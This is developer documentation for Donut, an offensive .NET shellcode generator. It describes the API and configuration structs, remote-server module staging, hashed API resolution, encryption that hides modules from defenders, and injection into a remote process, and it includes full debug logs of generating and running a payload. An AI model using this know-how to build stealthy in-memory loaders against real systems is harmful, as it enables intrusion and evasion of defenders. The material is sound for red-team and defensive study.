
<html>
<head><title>Donut</title></head>
<body>

<h3>API</h3>

<ul>
<li><code>int DonutCreate(PDONUT_CONFIG pConfig)</code></li>
<li><code>int DonutDelete(PDONUT_CONFIG pConfig)</code></li>
</ul>

<p>When provided with a valid configuration, <code>DonutCreate</code> will generate a shellcode to load a .NET assembly from memory. If the function returns <code>DONUT_ERROR_SUCCESS</code>, the configuration will contain three components:</p>

<ol>
  <li>An encrypted <var>Instance</var></li>
  <li>An encrypted <var>Module</var></li>
  <li>A position-independent code (PIC) or shellcode with <var>Instance</var> embedded in it.</li>
</ol>

<p>The key to decrypt the <var>Module</var> is stored in the <var>Instance</var> so that if a module is discovered on a staging server by an adversary, it should not be possible to decrypt the contents without the instance. <code>DonutDelete</code> will release any memory allocated by a successful call to <code>DonutCreate</code>. The <var>Instance</var> will already be attached to the PIC ready for executing in-memory, but the module may require saving to disk if the PIC will retrieve it from a remote HTTP server.</p>

<h3>Configuration</h3>

<p>A configuration requires a target architecture (only x86 and x86-64 are currently supported), a path to a .NET assembly that will be loaded from memory by the shellcode, a namespace/class, the name of a method to invoke, including any parameters passed to the method. If the module will be stored on a remote server, a URL is required, but not a module name because that will be generated randomly.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  arch<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// target architecture for shellcode</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span> domain<span style='color:#808030; '>[</span>DONUT_MAX_MODNAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// name of domain to create for assembly</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>cls<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// name of class and optional namespace</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>method<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// name of method to execute</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>param<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// string parameters passed to method, separated by comma or semi-colon</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>file<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// assembly to create module from</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span> url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>        <span style='color:#696969; '>// points to root path of where module will be on remote http server</span>
    <span style='color:#800000; font-weight:bold; '>char</span> runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// runtime version to use. v4.0.30319 is used by default</span>
    <span style='color:#800000; font-weight:bold; '>char</span> modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of module written to disk</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>  mod_type<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// DONUT_MODULE_DLL or DONUT_MODULE_EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  mod_len<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// size of DONUT_MODULE</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to donut module</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>  inst_type<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  inst_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// points to donut instance</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>  pic_len<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// size of shellcode</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>pic<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to PIC/shellcode</span>
<span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
</pre>

<table border="1">
  <tr>
    <th>Member</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><code>arch</code></td>
    <td>Indicates the type of assembly code to generate. <code>DONUT_ARCH_X86</code> and <code>DONUT_ARCH_X64</code> are recognized options. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td><code>domain</code></td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly.</td>
  </tr>
  <tr>
    <td><code>cls</code></td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</var></td>
  </tr>
  <tr>
    <td><code>method</code></td>
    <td>The method that will be invoked by the shellcode once .NET assembly is loaded into memory.</td>
  </tr>
  <tr>
    <td><code>param</code></td>
    <td>Contains a list of parameters for the method. Each separated by semi-colon or comma.</td>
  </tr>
  <tr>
    <td><code>file</code></td>
    <td>The path of the .NET assembly that will be loaded from memory.</td>
  </tr>
  <tr>
    <td><code>url</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should contain the server and path of where module will be stored. e.g: https://www.rogueserver.com/modules/</td>
  </tr>
  <tr>
    <td><code>runtime</code></td>
    <td>The CLR runtime version to use for the .NET assembly. If none is provided, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td><code>modname</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this will contain a randomly generated name for the module that should be used when saving the contents of <code>mod</code> to disk.</td>
  </tr>
  <tr>
    <td><code>mod_type</code></td>
    <td>Indicates the type of assembly detected by <code>DonutCreate</code>. Can be <code>DONUT_MODULE_DLL</code> or <code>DONUT_MODULE_EXE</code>.</td>
  </tr>
  <tr>
    <td><code>mod_len</code></td>
    <td>The total size of the <var>Module</var> pointed to by <code>mod</code>.</td>
  </tr>
  <tr>
    <td><code>mod</code></td>
    <td>Points to encrypted <var>Module</var>. If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should be saved to file using the <code>modname</code> and accessible via HTTP server.</td>
  </tr>
  <tr>
    <td><code>inst_type</code></td>
    <td><code>DONUT_INSTANCE_PIC</code> indicates a self-contained payload which means the .NET assembly is embedded in executable code. <code>DONUT_INSTANCE_URL</code> indicates the .NET assembly is stored on a remote server with a URL embedded in the instance.</td>
  </tr>
  <tr>
    <td><code>inst_len</code></td>
    <td>The total size of the <var>Instance</var> pointed to by <code>inst</code>.</td>
  </tr>
  <tr>
    <td><code>inst</code></td>
    <td>Points to an encrypted <var>Instance</var> after a successful call to <code>DonutCreate</code>. Since it's already attached to the <code>pic</code>, this is only provided for debugging purposes.</td>
  </tr>
  <tr>
    <td><code>pic_len</code></td>
    <td>The size of data pointed to by <code>pic</code>.</td>
  </tr>
  <tr>
    <td><code>pic</code></td>
    <td>Points to executable code for the target architecture which also contains an instance. This should be injected into a remote process.</td>
  </tr>
</table>

<p>Everything that follows here concerns internal workings of Donut and is not required to generate a payload.</p>

<h3>Instance</h3>

<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, it will decrypt the instance before attempting to resolve the address of API functions. If successful, it will check if a .NET assembly is embedded or must be downloaded from a remote server. To verify successful decryption, a randomly generated string is stored in the <code>sig</code> field that when hashed using <var>Maru</var> should match the value in <code>mac</code>.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_INSTANCE <span style='color:#800080; '>{</span>
    uint32_t    len<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// total size of instance</span>
    DONUT_CRYPT key<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// decrypts instance</span>
    <span style='color:#696969; '>// everything from here is encrypted</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>         dll_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the number of DLL to load before resolving API</span>
    <span style='color:#800000; font-weight:bold; '>char</span>        dll_name<span style='color:#808030; '>[</span>DONUT_MAX_DLL<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// a list of DLL strings to load</span>
    uint64_t    iv<span style='color:#800080; '>;</span>                           <span style='color:#696969; '>// the 64-bit initial value for maru hash</span>
    <span style='color:#800000; font-weight:bold; '>int</span>         api_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the 64-bit hashes of API required for instance to work</span>

    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      uint64_t  hash<span style='color:#808030; '>[</span><span style='color:#008c00; '>48</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 48 api hashes</span>
      <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>[</span><span style='color:#008c00; '>48</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 48 api addresses</span>
      <span style='color:#696969; '>// include prototypes only if header included from payload.h</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>ifdef</span><span style='color:#004a43; '> PAYLOAD_H</span>
      <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
        <span style='color:#696969; '>// imports from kernel32.dll</span>
        LoadLibraryA_t             LoadLibraryA<span style='color:#800080; '>;</span>
        GetProcAddress_t           <span style='color:#400000; '>GetProcAddress</span><span style='color:#800080; '>;</span>
        VirtualAlloc_t             <span style='color:#400000; '>VirtualAlloc</span><span style='color:#800080; '>;</span>             
        VirtualFree_t              <span style='color:#400000; '>VirtualFree</span><span style='color:#800080; '>;</span>  
        
        <span style='color:#696969; '>// imports from oleaut32.dll</span>
        SafeArrayCreate_t          SafeArrayCreate<span style='color:#800080; '>;</span>          
        SafeArrayCreateVector_t    SafeArrayCreateVector<span style='color:#800080; '>;</span>    
        SafeArrayPutElement_t      SafeArrayPutElement<span style='color:#800080; '>;</span>      
        SafeArrayDestroy_t         SafeArrayDestroy<span style='color:#800080; '>;</span>         
        SysAllocString_t           SysAllocString<span style='color:#800080; '>;</span>           
        SysFreeString_t            SysFreeString<span style='color:#800080; '>;</span>            
        
        <span style='color:#696969; '>// imports from wininet.dll</span>
        InternetCrackUrl_t         InternetCrackUrl<span style='color:#800080; '>;</span>         
        InternetOpen_t             InternetOpen<span style='color:#800080; '>;</span>             
        InternetConnect_t          InternetConnect<span style='color:#800080; '>;</span>          
        InternetSetOption_t        InternetSetOption<span style='color:#800080; '>;</span>        
        InternetReadFile_t         InternetReadFile<span style='color:#800080; '>;</span>         
        InternetCloseHandle_t      InternetCloseHandle<span style='color:#800080; '>;</span>      
        HttpOpenRequest_t          HttpOpenRequest<span style='color:#800080; '>;</span>          
        HttpSendRequest_t          HttpSendRequest<span style='color:#800080; '>;</span>          
        HttpQueryInfo_t            HttpQueryInfo<span style='color:#800080; '>;</span>
        
        <span style='color:#696969; '>// imports from mscoree.dll</span>
        CorBindToRuntime_t         CorBindToRuntime<span style='color:#800080; '>;</span>
        CLRCreateInstance_t        CLRCreateInstance<span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>endif</span>
    <span style='color:#800080; '>}</span> api<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// GUID required to load .NET assembly</span>
    <span style='color:#603000; '>GUID</span> xCLSID_CLRMetaHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xIID_ICLRMetaHost<span style='color:#800080; '>;</span>  
    <span style='color:#603000; '>GUID</span> xIID_ICLRRuntimeInfo<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xCLSID_CorRuntimeHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xIID_ICorRuntimeHost<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>GUID</span> xIID_AppDomain<span style='color:#800080; '>;</span>
    
    DONUT_INSTANCE_TYPE type<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// PIC or URL </span>
    
    <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
      <span style='color:#800000; font-weight:bold; '>char</span> url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>char</span> req<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>            <span style='color:#696969; '>// just a buffer for "GET"</span>
    <span style='color:#800080; '>}</span> http<span style='color:#800080; '>;</span>

    uint8_t     sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// string to hash</span>
    uint64_t    mac<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// to verify decryption ok</span>
    
    DONUT_CRYPT mod_key<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// used to decrypt module</span>
    uint64_t    mod_len<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// total size of module</span>
    
    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      PDONUT_MODULE p<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// for URL</span>
      DONUT_MODULE  x<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// for PIC</span>
    <span style='color:#800080; '>}</span> module<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span> DONUT_INSTANCE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_INSTANCE<span style='color:#800080; '>;</span>
</pre>

<h3>Module</h3>

<p>Modules can be attached to an <var>instance</var> or stored on a remote HTTP server. They are encrypted using a key stored in the instance.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>DWORD</span>   type<span style='color:#800080; '>;</span>                                   <span style='color:#696969; '>// EXE or DLL</span>
    <span style='color:#603000; '>WCHAR</span>   runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// runtime version</span>
    <span style='color:#603000; '>WCHAR</span>   domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// domain name to use</span>
    <span style='color:#603000; '>WCHAR</span>   cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// name of class and optional namespace</span>
    <span style='color:#603000; '>WCHAR</span>   method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// name of method to invoke</span>
    <span style='color:#603000; '>DWORD</span>   param_cnt<span style='color:#800080; '>;</span>                              <span style='color:#696969; '>// number of parameters to method</span>
    <span style='color:#603000; '>WCHAR</span>   param<span style='color:#808030; '>[</span>DONUT_MAX_PARAM<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// string parameters passed to method</span>
    <span style='color:#603000; '>CHAR</span>    sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// random string to verify decryption</span>
    ULONG64 mac<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// to verify decryption ok</span>
    <span style='color:#603000; '>DWORD</span>   len<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// size of .NET assembly</span>
    <span style='color:#603000; '>BYTE</span>    data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                                <span style='color:#696969; '>// .NET assembly file</span>
<span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
</pre>

<h3>API Hashing</h3>

<p>A hash function called <em>Maru</em> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the SPECK block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance.</p>

<h3>Encryption</h3>

<p>Chaskey is a 128-bit block cipher with support for 128-bit keys. Counter (CTR) mode turns the block cipher into a stream cipher that is then used to decrypt a <var>Module</var> or an <var>Instance</var> at runtime.</p>

<h3>Debugging payload</h3>

<p>The payload is capable of displaying detailed information about each step loading a .NET assembly from memory. To build a debug-enabled executable, specify the debug label with nmake/make for both donut.c and payload.c.</p>

<pre>
nmake debug -f Makefile.msvc
make debug -f Makefile.mingw
</pre>

<p>Use donut to create a payload as you normally would and a file called <code>instance</code> will be saved to disk.</p> 

<pre>
C:\hub\donut>donut -fhello.exe -parg1,arg2,arg3

  [ Donut .NET shellcode generator v0.9
  [ Copyright (c) 2019 TheWover, Odzhan

DEBUG: donut.c:465:DonutCreate(): Validating configuration and path of assembly
DEBUG: donut.c:479:DonutCreate(): Validating instance type
DEBUG: donut.c:496:DonutCreate(): Getting type of module
DEBUG: donut.c:257:GetModuleType(): Opening hello.exe
DEBUG: donut.c:261:GetModuleType(): Reading IMAGE_DOS_HEADER
DEBUG: donut.c:263:GetModuleType(): Checking e_magic
DEBUG: donut.c:265:GetModuleType(): Seeking position of IMAGE_NT_HEADERS
DEBUG: donut.c:267:GetModuleType(): Reading IMAGE_NT_HEADERS
DEBUG: donut.c:269:GetModuleType(): Checking Signature
DEBUG: donut.c:271:GetModuleType(): Characteristics : 0022
DEBUG: donut.c:500:DonutCreate(): Validating module type
DEBUG: donut.c:511:DonutCreate(): Checking architecture
DEBUG: donut.c:526:DonutCreate(): Creating module
DEBUG: donut.c:162:CreateModule(): stat(hello.exe)
DEBUG: donut.c:169:CreateModule(): Opening hello.exe...
DEBUG: donut.c:177:CreateModule(): Allocating 10008 bytes of memory for DONUT_MODULE
DEBUG: donut.c:192:CreateModule(): Domain  : FTYMHN7P
DEBUG: donut.c:207:CreateModule(): Runtime : v4.0.30319
DEBUG: donut.c:224:CreateModule(): Adding "arg1"
DEBUG: donut.c:224:CreateModule(): Adding "arg2"
DEBUG: donut.c:224:CreateModule(): Adding "arg3"
DEBUG: donut.c:530:DonutCreate(): Creating instance
DEBUG: donut.c:292:CreateInstance(): Checking configuration
DEBUG: donut.c:309:CreateInstance(): Generating random IV for Maru hash
DEBUG: donut.c:314:CreateInstance(): Generating random key for encrypting instance
DEBUG: donut.c:318:CreateInstance(): Generating random key for encrypting module
DEBUG: donut.c:325:CreateInstance(): Generated random string for signature : 7PM9CP9Y
DEBUG: donut.c:336:CreateInstance(): Allocating space for instance
DEBUG: donut.c:344:CreateInstance(): The size of module is 10008 bytes. Adding to size of instance.
DEBUG: donut.c:354:CreateInstance(): Setting the decryption key for instance
DEBUG: donut.c:357:CreateInstance(): Setting the decryption key for module
DEBUG: donut.c:361:CreateInstance(): Copying GUID structures to instance
DEBUG: donut.c:369:CreateInstance(): Copying DLL strings to instance
DEBUG: donut.c:376:CreateInstance(): Generating hashes for API using IV: 23addfebe9500040
DEBUG: donut.c:390:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 12583e052bfc9ee1
DEBUG: donut.c:390:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = c20f5b13459811aa
DEBUG: donut.c:390:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = d5bb0b42d9fee949
DEBUG: donut.c:390:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = 833a3b5fd4ca3e58
DEBUG: donut.c:390:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = aadf9fff24004eac
DEBUG: donut.c:390:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 2631ffb407819bcc
DEBUG: donut.c:390:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = f1a755faaa833595
DEBUG: donut.c:390:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = bcc5bb3575b76676
DEBUG: donut.c:390:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = 3ce08652c1dd2ddf
DEBUG: donut.c:390:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = 95e555ac873dc5ac
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = a60fe5e23a8990bb
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = 7178a2270f8d284b
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = 246792aa858f84b2
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = ba92c321e27771d7
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = 55f3b2e5220106f7
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = 9517dcf6b1fc1b0
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = 380354fbef3728c
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = d11ed29cf78d355a
DEBUG: donut.c:390:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = 6c79b83985db7265
DEBUG: donut.c:390:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = 2c15e0d40a7e4060
DEBUG: donut.c:390:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = 1db786658bba13cb
DEBUG: donut.c:437:CreateInstance(): Copying module data to instance
DEBUG: donut.c:442:CreateInstance(): encrypting instance
DEBUG: donut.c:535:DonutCreate(): Saving instance to file
  [ Instance Type : PIC
  [ .NET Assembly : "hello.exe"
  [ Assembly Type : EXE
  [ Parameters    : arg1,arg2,arg3
  [ Target CPU    : AMD64
  [ Shellcode     : "payload.bin"
</pre>

<p>Pass this file as a parameter to payload.exe and it will run on the host system as if in a target environment. </p>

<pre>
C:\hub\donut\payload>payload ..\instance
Running...
DEBUG: payload.c:53:ThreadProc(): Decrypting 17808 bytes of instance
DEBUG: payload.c:60:ThreadProc(): Generating hash to verify decryption
DEBUG: payload.c:62:ThreadProc(): Instance : 7f677bcb4212f576 | Result : 7f677bcb4212f576
DEBUG: payload.c:69:ThreadProc(): Resolving LoadLibraryA
DEBUG: payload.c:75:ThreadProc(): Loading mscoree.dll ...
DEBUG: payload.c:75:ThreadProc(): Loading oleaut32.dll ...
DEBUG: payload.c:75:ThreadProc(): Loading wininet.dll ...
DEBUG: payload.c:79:ThreadProc(): Resolving 21 API
DEBUG: payload.c:82:ThreadProc(): Resolving API address for C20F5B13459811AA
DEBUG: payload.c:82:ThreadProc(): Resolving API address for D5BB0B42D9FEE949
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 833A3B5FD4CA3E58
DEBUG: payload.c:82:ThreadProc(): Resolving API address for AADF9FFF24004EAC
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 2631FFB407819BCC
DEBUG: payload.c:82:ThreadProc(): Resolving API address for F1A755FAAA833595
DEBUG: payload.c:82:ThreadProc(): Resolving API address for BCC5BB3575B76676
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 3CE08652C1DD2DDF
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 95E555AC873DC5AC
DEBUG: payload.c:82:ThreadProc(): Resolving API address for A60FE5E23A8990BB
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 7178A2270F8D284B
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 246792AA858F84B2
DEBUG: payload.c:82:ThreadProc(): Resolving API address for BA92C321E27771D7
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 55F3B2E5220106F7
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 09517DCF6B1FC1B0
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 0380354FBEF3728C
DEBUG: payload.c:82:ThreadProc(): Resolving API address for D11ED29CF78D355A
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 6C79B83985DB7265
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 2C15E0D40A7E4060
DEBUG: payload.c:82:ThreadProc(): Resolving API address for 1DB786658BBA13CB
DEBUG: payload.c:115:LoadAssembly(): Using module embedded in instance
DEBUG: payload.c:123:LoadAssembly(): CLRCreateInstance
DEBUG: payload.c:131:LoadAssembly(): ICLRMetaHost::GetRuntime
DEBUG: payload.c:138:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
DEBUG: payload.c:142:LoadAssembly(): ICLRRuntimeInfo::GetInterface
DEBUG: payload.c:149:LoadAssembly(): HRESULT: 00000000
DEBUG: payload.c:171:LoadAssembly(): ICorRuntimeHost::Start
DEBUG: payload.c:178:LoadAssembly(): ICorRuntimeHost::CreateDomain
DEBUG: payload.c:186:LoadAssembly(): IUnknown::QueryInterface
DEBUG: payload.c:192:LoadAssembly(): SafeArrayCreate(10008 bytes)
DEBUG: payload.c:199:LoadAssembly(): Copying assembly to safe array
DEBUG: payload.c:204:LoadAssembly(): AppDomain::Load_3
DEBUG: payload.c:209:LoadAssembly(): Erasing assembly from memory
DEBUG: payload.c:214:LoadAssembly(): SafeArrayDestroy
DEBUG: payload.c:234:RunAssembly(): Using module embedded in instance
DEBUG: payload.c:242:RunAssembly(): Type is EXE
DEBUG: payload.c:247:RunAssembly(): MethodInfo::EntryPoint
DEBUG: payload.c:252:RunAssembly(): MethodInfo::GetParameters
DEBUG: payload.c:255:RunAssembly(): cbElements = 538
DEBUG: payload.c:268:RunAssembly(): Adding "arg1" as parameter 1
DEBUG: payload.c:268:RunAssembly(): Adding "arg2" as parameter 2
DEBUG: payload.c:268:RunAssembly(): Adding "arg3" as parameter 3
DEBUG: payload.c:290:RunAssembly(): MethodInfo::Invoke_3()
args[0] : arg1
args[1] : arg2
args[2] : arg3

DEBUG: payload.c:295:RunAssembly(): MethodInfo::Invoke_3 : 00000000 : Success
DEBUG: payload.c:389:FreeAssembly(): MethodInfo::Release
DEBUG: payload.c:395:FreeAssembly(): Assembly::Release
DEBUG: payload.c:401:FreeAssembly(): AppDomain::Release
DEBUG: payload.c:407:FreeAssembly(): IUnknown::Release
DEBUG: payload.c:413:FreeAssembly(): ICorRuntimeHost::Stop
DEBUG: payload.c:416:FreeAssembly(): ICorRuntimeHost::Release
DEBUG: payload.c:422:FreeAssembly(): ICLRRuntimeInfo::Release
DEBUG: payload.c:428:FreeAssembly(): ICLRMetaHost::Release
</pre>

<p>Obviously you should be cautious with what assemblies you decide to execute on your machine.</p>

</body>
</html>




